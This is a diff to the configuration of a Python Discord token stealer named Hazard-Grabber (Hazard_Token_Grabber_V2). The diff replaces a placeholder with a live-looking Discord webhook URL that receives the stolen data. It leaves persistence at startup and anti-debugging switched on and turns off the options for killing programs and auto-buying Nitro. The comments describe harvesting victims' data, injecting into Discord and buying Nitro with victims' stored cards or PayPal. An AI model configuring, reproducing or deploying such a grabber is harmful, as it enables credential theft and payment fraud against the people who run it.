@@ -39,10 +39,10 @@ except:
 
 config = {
     # Replace WEBHOOK_URL with your own webhook. The collected data will be sent to this webhook. 
-    'webhook': "WEBHOOK_URL",
+    'webhook': "https://discord.com/api/webhooks/1433573056349208616/P5nG83lPPcTV3hJzGKD5ixaCKgMticlfPqeI-yDnJogi65VOAL1z9HliCaZ6Afhl9lRJ",
     
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
-    'kill_processes': True,
+    'kill_processes': False,
     
     # This makes the program run the file after every startup.
     'startup': True,
@@ -54,7 +54,7 @@ config = {
     'anti_debug': True,
     
     # If successfully injected to Discord, the program will try to automatically buy Discord Nitro with Credit Cards/PayPal/Other Payments and send it to your webhook.
-    'auto_buy_nitro': True,
+    'auto_buy_nitro': False,
     
     # This list of programs will be killed if Hazard-Grabber detects that any of these are running, you can add more or remove programs if you want.
     'blackListedPrograms':
@@ -725,3 +725,4 @@ class AntiDebug(functions):
 
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(Hazard_Token_Grabber_V2().init())
+
